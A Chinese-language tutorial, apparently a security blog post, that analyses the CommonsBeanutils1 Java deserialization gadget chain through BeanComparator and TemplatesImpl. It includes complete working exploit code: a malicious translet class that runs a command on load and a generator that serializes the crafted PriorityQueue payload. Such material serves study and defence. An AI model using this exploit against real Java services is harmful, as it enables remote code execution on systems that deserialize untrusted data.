# 1.环境

jdk8 不受版本影响均可

```xml
<dependency>  
 <groupId>commons-beanutils</groupId>  
 <artifactId>commons-beanutils</artifactId>  
 <version>1.9.2</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.1</version>  
</dependency>  
<!-- https://mvnrepository.com/artifact/commons-logging/commons-logging -->  
<dependency>  
 <groupId>commons-logging</groupId>  
 <artifactId>commons-logging</artifactId>  
 <version>1.2</version>  
</dependency>
```

# 2.Commons BeanUtils 简介

Apache Commons BeanUtils 是 Apache Commons 项目的一部分，提供了一组方便的 Java API，用于操作 JavaBean 属性。它简化了 JavaBean 的属性访问和修改操作，允许开发者以更加通用和灵活的方式操作 Java 对象的属性。

比如这样一个类

```java
public class Person {
	private String name; // 属性一般定义为private
	public Person(String name) {
        this.name = name;
	}
	public String getName() {  //读方法
		return name;
	}
	
	public void setName(String n) {  //写方法
		name = n;
	}
}
```

它包含了一个私有属性name，以及读取和设置这个属性的两个public方法 getName()和setName()，即getter和setter

这种 class 就是 JavaBean

commons-beanutils中提供了一个静态方法`PropertyUtils.getProperty()`，可以让使用者直接调用任意JavaBean的getter方法

`PropertyUtils.getProperty()`传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性

```java
Person person = new Person("Mike");
PropertyUtils.getProperty(person,"name");
# 等价于
Person person = new Person("Mike");
person.getName();
```

除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象
中有属性c，我们可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个
方法，使用者可以很方便地调用任意对象的getter

因此，如果getter方法存在可以rce的点可以利用的话，就存在安全问题了。
# 3.利用链分析

```
/*
TemplatesImpl#getOutputProperties()
    TemplatesImpl#newTransformer()
        TemplatesImpl#getTransletInstance()
            TemplatesImpl#defineTransletClasses()
                TransletClassLoader#defineClass()
*/
```

TemplatesImpl#getOutputProperties()

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817135830.png)

TemplatesImpl#newTransformer()

![image-20240817135857703](C:\Users\86158\AppData\Roaming\Typora\typora-user-images\image-20240817135857703.png)

TemplatesImpl#getTransletInstance()

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817140318.png)

TemplatesImpl#defineTransletClasses()

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817140747.png)

TransletClassLoader#defineClass()

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817142920.png)

链子的开头——TemplatesImpl#getOutputProperties()是一个getter方法，且作用域为public，所以可以通过Commons BeanUtils中的PropertyUtils.getProperty方式获取

```java
PropertyUtils.getProperty(new TemplatesImpl(), outputProperties)
```

接下来找一下哪里调用了PropertyUtils.getProperty()

在之前的CC2/4的链中我们用到了`java.util.PriorityQueue`的readObject触发反序列化，主要是通过调用了其`TransformingComparator`的compare方法，进而调用了transform链的调用

而 CommonsBeanutils 利用链中核心的触发位置就是 `BeanComparator.compare()` 函数，当调用 `BeanComparator.compare()` 函数时，其内部会调用我们前面说的 `getProperty` 函数，进而调用 JavaBean 中对应属性的 getter 函数

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817150332.png)

这里会调用`PropertyUtils.getProperty()`方法 因此通过给 o1赋值构造好的templates对象，property赋值为TemplatesImpl的 outputProperties属性，即可调用`TemplatesImpl.getOutputProperties()` 往下就是TemplatesImpl的利用链

compare则可以利用CC2和CC4链中用的PriorityQueue.readObject()

详见：https://github.com/ITroyeSivan/MyBlog/blob/main/WebSec/JavaSec/CommonsCollections/CC%E9%93%BE4-CommonsCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90.md

于是完整的利用链就是：

```
PriorityQueue.readObject() -> 
PriorityQueue.heapify() -> 
PriorityQueue.siftDown() -> 
PriorityQueue.siftDownUsingComparator() -> 
BeanComparator.compare() -> 
PropertyUtils.getProperty(TemplatesImpl, outputProperties) -> 
TemplatesImpl#getOutputProperties() -> 
TemplatesImpl#newTransformer() -> 
TemplatesImpl#getTransletInstance() -> 
TemplatesImpl#defineTransletClasses() -> 
TransletClassLoader#defineClass() ->
Evil.newInstance()
```

与CC2/4 略微不同的是，还需要用反射去修改 queue属性的值，因为要控制 BeanComparator.compare()的参数为恶意templates对象

# 4.编写exp

`CommonsBeanUtils1` 的链子又两个主要的部分组成:

- 一部分是利用 `TemplatesImpl` 动态加载字节码。
- 另一部分是通过 `CommonsBeanUtils` 中的 `PropertyUtils` 读取 getter 请求。

## 1.利用 TemplatesImpl 动态加载字节码

在 `TemplatesImpl` 类中有一个内部类 `TransletClassLoader`，这个类是继承 `ClassLoader`，并且重写了 `defineClass` 方法。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817160325.png)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817160338.png)

这里的 `defineClass` 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。

追到最前面两个方法 `TemplatesImpl#getOutputProperties()` 和 `TemplatesImpl#newTransformer()` ，这两者的作用域是public，可以被外部调用。

这一部分详见之前关于字节码的文章：

https://github.com/ITroyeSivan/MyBlog/blob/main/WebSec/JavaSec/JavaSec%E5%9F%BA%E7%A1%80/JavaSec%E5%9F%BA%E7%A1%8007-%E5%AD%97%E8%8A%82%E7%A0%81.md#%E5%88%A9%E7%94%A8templateimpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81

```java
package com.example.cb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class exp {
    public static void main(String[] args) throws Exception{
        try{
            byte[] codes = Files.readAllBytes(Paths.get("路径\\evil.class"));
            byte[][] _bytecodes = new byte[][] {codes};
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", _bytecodes);
            setFieldValue(templates, "_name", "Troy3e");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();


        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }
}
```

其中，修改三个变量的原因分别为：

1._bytecodes包含了字节码。

2._name不能为空，否则会返回null。

3._tfactory不手动设置的话为空，无法进入到下面的defineClass。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817174019.png)

另外，evil.class如下：

```java
package com.example.cb;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class evil extends AbstractTranslet {

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public evil() throws Exception{
        super();
        Runtime.getRuntime().exec("calc");
    }
}
```

注意必须继承AbstractTranslet抽象类，原因见下图：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817174712.png)

## 2.完整exp

看到BeanComparator.compare：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240817175050.png)

这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。

所以如果需要传值比较，肯定是需要新建一个 `PriorityQueue` 的队列，并让其有 2 个值进行比较。而且 `PriorityQueue` 的构造函数当中就包含了一个比较器。

此外，还需要用反射去修改 queue属性的值，因为要控制 BeanComparator.compare()的参数为恶意templates对象

```java
package com.example.cb;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.PriorityQueue;

public class exp {
    public static void main(String[] args) throws Exception{
        try{
            byte[] codes = Files.readAllBytes(Paths.get("xxx\\evil.class"));
            byte[][] _bytecodes = new byte[][] {codes};
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", _bytecodes);
            setFieldValue(templates, "_name", "Troy3e");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            BeanComparator comparator = new BeanComparator();
            PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            queue.add(1);
            queue.add(1);

            setFieldValue(queue,"queue",new Object[]{templates,templates});
            setFieldValue(comparator,"property","outputProperties");

            serialize(queue);
            unserialize("ser.bin");

        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object obj, String fieldName, Object fieldValue) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```



# 5.参考链接

https://liaoxuefeng.com/books/java/oop/core/javabean/index.html

https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/

https://www.cnblogs.com/1vxyz/p/17588722.html
